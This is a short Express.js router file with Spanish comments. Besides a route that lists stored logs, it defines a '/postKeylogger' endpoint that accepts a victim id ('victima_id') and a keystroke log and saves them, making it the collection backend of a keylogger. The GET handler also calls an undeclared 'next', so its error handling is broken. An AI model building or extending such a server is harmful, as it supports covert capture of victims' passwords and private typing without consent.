//importar la libreria de express
const express = require('express');
//importar el router de express
const router=express.Router();
//importar el servicio para log de usuario
const UserLogService = require('./../services/userLogService');
const service = new UserLogService();

router.get('/', async (req, res) => {
    try {
        const users = await service.find();
        res.json(users);
      } catch (error) {
        next(error);
      }
});


router.post('/postKeylogger',async (req,res)=>{
  try{
    const body=req.body;
    const log= await service.postLog(body.victima_id,body.log);
    res.json(log);
  }catch(error){
    console.log(error);
  }
});



module.exports=router;